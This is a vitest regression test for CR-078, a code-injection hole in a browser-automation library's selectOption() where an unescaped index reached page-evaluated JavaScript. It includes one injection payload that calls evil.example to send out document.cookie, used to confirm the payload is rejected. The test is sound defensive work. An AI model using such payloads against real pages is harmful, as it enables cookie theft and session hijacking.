import { createRequire } from "node:module";
import { describe, expect, test, vi } from "vitest";

// The CDP library under src/qa/adapters/web/lib/ is vendored CommonJS.
// Bun tolerated a bare `require()` in an ESM file; Node and vitest do not.
// Same fix as src/qa/adapters/web/adapter.ts.
const require = createRequire(import.meta.url);

const { attachSelectOption } = require(
  "../../../../../src/qa/adapters/web/lib/select-option.js",
);

// CR-078: selectOption()'s `index` parameter was interpolated unescaped into
// the evaluated JS source (`elements[${index}]`, and again in the
// 'Element not found at index ${index}' error string) — unlike every sibling
// value in the same function (`selector`, `value`), which goes through
// JSON.stringify. A non-numeric `index` (e.g. a string ending
// `0]; fetch(...); //`) would break out of the array-index expression into
// arbitrary JS running in the page context.
describe("CR-078: selectOption rejects a non-integer index instead of splicing it into evaluated JS", () => {
  test("a malicious non-integer index is rejected before ever reaching the page-context eval", async () => {
    const sendSpy = vi.fn(async () => ({ result: { value: 3 } }));
    const ps = { send: sendSpy };
    const { selectOption } = attachSelectOption({ getPageSession: async () => ps });

    const malicious = "0]; fetch('https://evil.example/'+document.cookie); //";

    await expect(
      selectOption(0, "#sel", "a", malicious as unknown as number),
    ).rejects.toThrow(/integer/i);

    // The real defect: with no validation, this string was spliced straight
    // into a Runtime.evaluate expression sent to the page. It must never
    // reach ps.send at all.
    expect(sendSpy).not.toHaveBeenCalled();
  });

  test("a valid integer index still selects normally", async () => {
    let call = 0;
    const sendSpy = vi.fn(async (method: string) => {
      call += 1;
      if (method !== "Runtime.evaluate") return {};
      if (call === 1) {
        // countJs: how many elements the selector matches.
        return { result: { value: 1 } };
      }
      // The main select-logic script's result shape.
      return {
        result: {
          value: {
            success: true,
            matchCount: 1,
            matched: [{ value: "a", text: "A" }],
          },
        },
      };
    });
    const ps = { send: sendSpy };
    const { selectOption } = attachSelectOption({ getPageSession: async () => ps });

    const result = await selectOption(0, "#sel", "a", 0);
    expect(result.success).toBe(true);
    expect(sendSpy).toHaveBeenCalledTimes(2);
  });
});
